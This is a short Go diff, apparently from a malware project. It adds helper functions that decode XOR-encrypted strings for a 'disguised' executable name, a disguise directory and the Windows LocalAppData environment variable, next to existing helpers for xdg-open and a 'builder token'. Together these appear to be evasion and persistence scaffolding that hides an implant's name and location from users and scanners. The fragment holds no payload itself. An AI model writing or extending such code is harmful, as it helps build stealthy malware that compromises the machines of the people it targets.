@@ -451,6 +451,18 @@ func getXdgOpen() string {
 	return string(xor(encXdgOpen, decryptionKey))
 }
 
+func getDisguisedExeName() string {
+	return string(xor(encDisguisedExeName, decryptionKey))
+}
+
+func getDisguiseDir() string {
+	return string(xor(encDisguiseDir, decryptionKey))
+}
+
+func getLocalAppDataEnv() string {
+	return string(xor(encLocalAppDataEnv, decryptionKey))
+}
+
 func getBuilderToken() []byte {
 	if len(encBuilderToken) == 0 {
 		return nil
